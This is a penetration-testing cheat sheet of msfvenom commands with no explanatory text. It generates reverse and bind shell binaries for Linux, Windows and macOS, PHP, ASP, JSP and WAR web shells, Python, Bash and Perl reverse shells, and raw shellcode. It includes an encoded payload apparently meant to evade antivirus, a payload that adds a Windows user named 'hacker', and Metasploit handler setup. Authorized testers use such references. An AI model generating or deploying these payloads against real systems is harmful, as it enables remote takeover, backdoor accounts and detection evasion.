# msfvenom cheatsheet

**List payloads**  
 msfvenom -l

**Binaries Payloads**

**Linux Meterpreter Reverse Shell**  
 msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; shell.elf

**Linux Bind Meterpreter Shell**  
 msfvenom -p linux/x86/meterpreter/bind\_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; bind.elf

**Linux Bind Shell**  
 msfvenom -p generic/shell\_bind\_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; term.elf

**Windows Meterpreter Reverse TCP Shell**  
 msfvenom -p windows/meterpreter/reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f exe &gt; shell.exe

**Windows Reverse TCP Shell**  
 msfvenom -p windows/shell/reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f exe &gt; shell.exe

**Windows Encoded Meterpreter Windows Reverse Shell**  
 msfvenom -p windows/meterpreter/reverse\_tcp -e shikata\_ga\_nai -i 3 -f exe &gt; encoded.exe

**Mac Reverse Shell**  
 msfvenom -p osx/x86/shell\_reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f macho &gt; shell.macho

**Mac Bind Shell**  
 msfvenom -p osx/x86/shell\_bind\_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f macho &gt; bind.macho

**Web Payloads**

**PHP Meterpreter Reverse TCP**  
 msfvenom -p php/meterpreter\_reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.php  
 cat shell.php \| pbcopy && echo ‘&lt;?php ‘ \| tr -d ‘\n’ &gt; shell.php && pbpaste &gt;&gt; shell.php

**ASP Meterpreter Reverse TCP**  
 msfvenom -p windows/meterpreter/reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f asp &gt; shell.asp

**JSP Java Meterpreter Reverse TCP**  
 msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.jsp

**WAR**  
 msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f war &gt; shell.war

**Scripting Payloads  
  
 Python Reverse Shell**  
 msfvenom -p cmd/unix/reverse\_python LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.py

**Bash Unix Reverse Shell**  
 msfvenom -p cmd/unix/reverse\_bash LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.sh

**Perl Unix Reverse shell**  
 msfvenom -p cmd/unix/reverse\_perl LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.pl

**Shellcode**

Windows Meterpreter Reverse TCP Shellcode  
 msfvenom -p windows/meterpreter/reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;

**Linux Meterpreter Reverse TCP Shellcode**  
 msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;

**Mac Reverse TCP Shellcode**  
 msfvenom -p osx/x86/shell\_reverse\_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;

**Create User**  
 msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe &gt; adduser.exe

**Metasploit Handler**

use exploit/multi/handler  
 set PAYLOAD &lt;Payload name&gt;  
 Set RHOST &lt;Remote IP&gt;  
 set LHOST &lt;Local IP&gt;  
 set LPORT &lt;Local Port&gt;  
 Run

